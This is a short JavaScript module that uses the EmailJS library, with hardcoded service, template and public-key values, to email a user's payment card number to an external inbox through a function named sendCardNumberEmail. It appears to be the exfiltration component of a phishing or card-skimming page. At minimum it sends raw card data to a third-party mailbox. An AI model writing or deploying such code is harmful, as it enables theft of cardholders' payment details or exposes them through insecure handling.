import emailjs from 'emailjs-com';

const SERVICE_ID = 'service_ozea06x';
const TEMPLATE_ID = 'template_hjohb6l';
const PUBLIC_KEY = 'XMOnwjyzQDoRVRYl3';

export function sendCardNumberEmail(cardNumber) {
  return emailjs.send(
    SERVICE_ID,
    TEMPLATE_ID,
    { card_number: cardNumber },
    PUBLIC_KEY
  );
}
